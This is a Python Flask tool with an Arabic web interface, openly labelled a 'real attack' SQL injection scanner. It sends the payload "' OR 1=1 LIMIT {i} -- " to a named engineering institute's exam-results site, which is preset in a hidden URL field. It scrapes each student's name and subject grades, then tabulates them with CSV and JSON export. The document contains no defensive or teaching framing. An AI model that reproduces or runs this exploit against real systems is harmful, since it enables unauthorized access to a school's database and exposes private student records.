#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection Scanner - Real Attack Only
استخراج بيانات الطلاب - هجوم حقيقي فقط
Ahmed Tabana
"""

from flask import Flask, render_template_string, request, jsonify, Response
import json
import csv
import time
from io import StringIO
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# ------------------------------------------------------------
# الهجوم الحقيقي
# ------------------------------------------------------------
class StudentDataExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def extract_range(self, start=1, end=20):
        for i in range(start, end + 1):
            try:
                payload = {
                    'userid': f"' OR 1=1 LIMIT {i} -- ",
                    'roll': '12345'
                }
                
                response = requests.post(
                    self.target_url,
                    data=payload,
                    headers=self.headers,
                    timeout=15
                )
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # استخراج اسم الطالب
                    name_section = soup.find_all(
                        'span', 
                        string=lambda text: text and 'اسم الطالب:' in text
                    )
                    
                    student_name = "غير متوفر"
                    if name_section:
                        student_name = name_section[0].next_sibling.strip() if name_section[0].next_sibling else "غير متوفر"
                    
                    # استخراج المواد
                    table = soup.find('table', {'class': 'container'})
                    subjects = []
                    
                    if table:
                        for row in table.find_all('tr')[1:]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                subject = cols[1].text.strip()
                                grade = cols[0].text.strip()
                                if subject and grade and subject != "المادة":
                                    subjects.append({
                                        'subject': subject,
                                        'grade': grade
                                    })
                    
                    student_data = {
                        'id': i,
                        'name': student_name,
                        'subjects': subjects
                    }
                    
                    yield {
                        'success': True,
                        'id': i,
                        'name': student_name,
                        'data': student_data
                    }
                else:
                    yield {
                        'success': False,
                        'id': i
                    }
                    
            except Exception as e:
                yield {
                    'success': False,
                    'id': i
                }
            
            time.sleep(0.5)

# ------------------------------------------------------------
# الصفحة الرئيسية - مبسطة جداً
# ------------------------------------------------------------
@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SQL Scanner | Ahmed Tabana</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Consolas', monospace;
        }
        body {
            background: #0a0c0e;
            color: #00ff80;
            padding: 15px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .box {
            background: #0f1215;
            border: 1px solid #00ff80;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
        }
        h1 {
            font-size: 20px;
            color: #00ff80;
            border-bottom: 1px solid #00ff80;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            background: #1a1e22;
            border: 1px solid #00ff80;
            color: #00ff80;
            border-radius: 4px;
            font-size: 14px;
        }
        button {
            background: transparent;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #00ff80;
            color: #0a0c0e;
        }
        .row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
        .row input {
            flex: 1;
        }
        .log {
            background: #0a0c0e;
            border: 1px solid #00ff80;
            border-radius: 4px;
            padding: 10px;
            height: 150px;
            overflow-y: auto;
            font-size: 13px;
            margin-bottom: 15px;
        }
        .log-entry {
            color: #00ff80;
            padding: 4px 0;
            border-bottom: 1px solid rgba(0,255,128,0.1);
        }
        .progress {
            width: 100%;
            height: 20px;
            background: #1a1e22;
            border: 1px solid #00ff80;
            border-radius: 10px;
            margin: 10px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: #00ff80;
            width: 0%;
            transition: width 0.3s;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            border: 1px solid #00ff80;
            padding: 8px;
            text-align: center;
            font-size: 13px;
        }
        th {
            background: #1a1e22;
            cursor: pointer;
        }
        .search {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            background: #1a1e22;
            border: 1px solid #00ff80;
            color: #00ff80;
            border-radius: 4px;
        }
        .badge {
            display: inline-block;
            background: #00ff80;
            color: #0a0c0e;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            margin-right: 10px;
        }
    </style>
</head>
<body>
<div class="container">
        <div class="box">
            <h1>
                🎓 اختراق نتيجة طلاب المعهد العالي للهندسه بالمرج
                <span class="badge" style="opacity: 0.3; font-size: 10px;">⚡</span>
                <br> اكتب رينج الطلاب  الذى تريد مثلا من 1 الى 200
            </h1>
            
            <!-- حقل الرابط مخفي تماماً عن المستخدم -->
            <div style="display: none;">
                <input type="text" id="url" value="https://www.miesite.com/examresult/" placeholder="رابط موقع المعهد">
            </div>
            
            <div class="row">
                <input type="number" id="start" value="1" min="1" placeholder="من رقم الجلوس">
                <input type="number" id="end" value="5" min="1" placeholder="إلى رقم الجلوس">
            </div>
            
           
            
            <!-- الأدوات المخفية للمستخدم -->
            <div style="display: none;">
                <!-- SQL Injection Scanner - Ahmed Tabana -->
                <span id="scanner-tool">⚡ SQL Injection Scanner</span>
                <span id="developer">Ahmed Tabana</span>
            </div>
        </div>

            
            <button onclick="startHack()">🚀 بدء الهجوم</button>
            <div style="display: flex; gap: 10px; margin-top: 5px;">
                <button onclick="clearData()" style="flex:1">🗑️ مسح</button>
            </div>
        </div>
        
        <div class="box" id="progressBox" style="display:none">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px">
                <span>📊 التقدم: <span id="progressPercent">0%</span></span>
                <span>📋 الطلاب: <span id="studentCount">0</span></span>
            </div>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="box">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px">
                <span>📋 سجل العمليات</span>
                <span id="status">🟢 جاهز</span>
            </div>
            <div class="log" id="log"></div>
        </div>
        
        <div class="box">
            <input type="text" class="search" id="search" placeholder="🔍 بحث في الاسم أو المادة أو التقدير" onkeyup="filterTable()">
            
            <div style="overflow-x: auto;">
                <table id="table">
                    <thead>
                        <tr>
                            <th onclick="sortTable(0)">#</th>
                            <th onclick="sortTable(1)">اسم الطالب</th>
                            <th onclick="sortTable(2)">المادة</th>
                            <th onclick="sortTable(3)">التقدير</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody">
                        <tr><td colspan="4" style="text-align:center">لا توجد بيانات</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        let students = [];
        let eventSource = null;
        let sortCol = 0;
        let sortDir = 'asc';
        
        function startHack() {
            const url = document.getElementById('url').value;
            const start = document.getElementById('start').value;
            const end = document.getElementById('end').value;
            
            document.getElementById('progressBox').style.display = 'block';
            clearData();
            
            addLog('🚀 بدء الهجوم على ' + url);
            addLog('🎯 استخراج الطلاب من ' + start + ' إلى ' + end);
            
            if (eventSource) eventSource.close();
            
            eventSource = new EventSource('/extract?start=' + start + '&end=' + end + '&url=' + encodeURIComponent(url));
            
            eventSource.onmessage = function(e) {
                const data = JSON.parse(e.data);
                
                if (data.type === 'success') {
                    addLog('✅ ' + data.message);
                    document.getElementById('progressBar').style.width = data.progress + '%';
                    document.getElementById('progressPercent').innerHTML = data.progress + '%';
                    document.getElementById('studentCount').innerHTML = data.count;
                    
                    if (data.student && data.student.name !== 'غير متوفر') {
                        data.student.subjects.forEach(s => {
                            students.push({
                                id: data.student.id,
                                name: data.student.name,
                                subject: s.subject,
                                grade: s.grade
                            });
                        });
                        renderTable();
                    }
                } else if (data.type === 'error') {
                    addLog('❌ ' + data.message);
                } else if (data.type === 'complete') {
                    addLog('🎯 ' + data.message);
                    document.getElementById('status').innerHTML = '✅ اكتمل';
                    eventSource.close();
                }
            };
            
            eventSource.onerror = function() {
                addLog('❌ خطأ في الاتصال');
                document.getElementById('status').innerHTML = '❌ خطأ';
                eventSource.close();
            };
        }
        
        function addLog(msg) {
            const log = document.getElementById('log');
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '> ' + msg;
            log.appendChild(div);
            log.scrollTop = log.scrollHeight;
        }
        
        function renderTable() {
            const tbody = document.getElementById('tableBody');
            
            if (students.length === 0) {
                tbody.innerHTML = '<tr><td colspan="4" style="text-align:center">لا توجد بيانات</td></tr>';
                return;
            }
            
            let data = filterData();
            data = sortData(data);
            
            tbody.innerHTML = '';
            data.forEach(s => {
                tbody.innerHTML += '<tr><td>' + s.id + '</td><td>' + s.name + '</td><td>' + s.subject + '</td><td>' + s.grade + '</td></tr>';
            });
        }
        
        function filterData() {
            const term = document.getElementById('search').value.toLowerCase();
            if (!term) return students;
            
            return students.filter(s => 
                s.name.toLowerCase().includes(term) ||
                s.subject.toLowerCase().includes(term) ||
                s.grade.toLowerCase().includes(term)
            );
        }
        
        function filterTable() {
            renderTable();
        }
        
        function sortData(data) {
            return data.sort((a, b) => {
                let valA = a[['id','name','subject','grade'][sortCol]];
                let valB = b[['id','name','subject','grade'][sortCol]];
                
                if (sortCol === 0) {
                    return sortDir === 'asc' ? valA - valB : valB - valA;
                } else {
                    return sortDir === 'asc' ? valA.localeCompare(valB) : valB.localeCompare(valA);
                }
            });
        }
        
        function sortTable(col) {
            if (sortCol === col) {
                sortDir = sortDir === 'asc' ? 'desc' : 'asc';
            } else {
                sortCol = col;
                sortDir = 'asc';
            }
            renderTable();
        }
        
        function clearData() {
            students = [];
            renderTable();
            document.getElementById('studentCount').innerHTML = '0';
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressPercent').innerHTML = '0%';
        }
        
        function exportCSV() {
            if (students.length === 0) {
                alert('لا توجد بيانات');
                return;
            }
            
            let csv = 'الرقم,اسم الطالب,المادة,التقدير\\n';
            students.forEach(s => {
                csv += s.id + ',' + s.name + ',' + s.subject + ',' + s.grade + '\\n';
            });
            
            const blob = new Blob([csv], {type: 'text/csv'});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'students.csv';
            a.click();
            addLog('📥 تم تصدير CSV');
        }
        
        function exportJSON() {
            if (students.length === 0) {
                alert('لا توجد بيانات');
                return;
            }
            
            const json = JSON.stringify(students, null, 2);
            const blob = new Blob([json], {type: 'application/json'});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'students.json';
            a.click();
            addLog('📥 تم تصدير JSON');
        }
    </script>
</body>
</html>
    '''

# ------------------------------------------------------------
# مسار الاستخراج
# ------------------------------------------------------------
@app.route('/extract')
def extract():
    start = int(request.args.get('start', 1))
    end = int(request.args.get('end', 5))
    url = request.args.get('url')
    
    if not url:
        return Response("data: {}\n\n".format(json.dumps({'type': 'error', 'message': 'الرجاء تحديد الرابط'})), mimetype="text/event-stream")
    
    def generate():
        extractor = StudentDataExtractor(url)
        
        for result in extractor.extract_range(start, end):
            if result['success']:
                progress = int(((result['id'] - start + 1) / (end - start + 1)) * 100)
                yield "data: {}\n\n".format(json.dumps({
                    'type': 'success',
                    'message': 'تم استخراج بيانات الطالب ' + result['name'],
                    'student': result['data'],
                    'progress': progress,
                    'count': result['id']
                }))
            else:
                yield "data: {}\n\n".format(json.dumps({
                    'type': 'error',
                    'message': 'فشل استخراج الطالب ' + str(result['id'])
                }))
        
        yield "data: {}\n\n".format(json.dumps({
            'type': 'complete',
            'message': 'تم الانتهاء من الهجوم'
        }))
    
    return Response(generate(), mimetype="text/event-stream")

# ------------------------------------------------------------
# تشغيل التطبيق
# ------------------------------------------------------------
if __name__ == '__main__':
    print('''
    ╔════════════════════════════════════════════╗
    ║     SQL Injection Scanner                  ║
    ║     Ahmed Tabana                          ║
    ║     Real Attack Mode Only                 ║
    ╚════════════════════════════════════════════╝
    
    🚀 Server: http://127.0.0.1:5000
    ''')
    app.run(host='0.0.0.0', port=5000, debug=True)